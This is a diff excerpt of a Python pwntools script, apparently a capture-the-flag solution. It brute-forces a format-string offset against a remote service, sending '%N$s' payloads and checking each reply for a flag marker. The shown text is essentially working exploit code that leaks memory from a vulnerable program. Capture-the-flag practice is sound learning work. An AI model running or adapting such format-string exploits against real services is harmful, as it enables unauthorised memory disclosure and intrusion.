@@ -2,13 +2,15 @@ from pwn import *
 from binascii import unhexlify
 
 def exploit():
-    # 爆破偏移量
+    fmt = '%s'
     found_flag = False
+    
+    # 爆破偏移量
     for offset in range(1, 20):
         if found_flag:
             break
-        p = remote('124.16.75.117', 51003)
-        p.sendlineafter(b'> ', f'{'%s'}'.encode().replace(b'%', f'%{offset}$'.encode()))
+        p = remote('124.16.75.117', 51005)
+        p.sendlineafter(b'> ', f'{fmt}'.encode().replace(b'%', f'%{offset}$'.encode()))
         try:
             data = p.recvline()
             # 判断data中是否含有"NeSE"字样
